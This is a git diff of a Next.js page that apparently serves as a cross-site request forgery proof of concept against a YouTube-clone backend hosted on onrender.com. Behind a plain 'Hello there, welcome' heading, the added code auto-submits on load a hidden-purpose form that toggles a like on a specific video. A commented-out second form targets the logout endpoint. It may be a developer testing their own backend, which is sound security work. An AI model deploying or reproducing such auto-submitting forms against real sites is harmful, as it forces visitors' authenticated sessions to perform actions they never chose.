@@ -1,8 +1,10 @@
 "use client";
-import { useEffect } from "react";
+import { useEffect, useRef } from "react";
 import axios from "axios";
 
 export default function Page() {
+    const formRef1 = useRef<HTMLFormElement>(null);
+    const formRef2 = useRef<HTMLFormElement>(null);
     const attack = async () => {
         const formData = new FormData();
 
@@ -20,11 +22,19 @@ export default function Page() {
 
     useEffect(() => {
         attack();
+        formRef1.current?.submit();
+        // formRef2.current?.submit();
     }, []);
 
     return (
         <div>
             <h1 className="text-2xl text-white">Hello there, welcome</h1>
+            <form action="https://youtube-backend-9k0x.onrender.com/api/v1/likes/toggle/v/66cca33309d0fafd32a8981a" method="POST" ref={formRef1}>
+                <button type="submit">Like</button>
+            </form>
+            {/* <form action="https://youtube-backend-9k0x.onrender.com/api/v1/users/logout" method="POST" ref={formRef2}>
+                <button type="submit">Logout</button>
+            </form> */}
         </div>
     );
 }
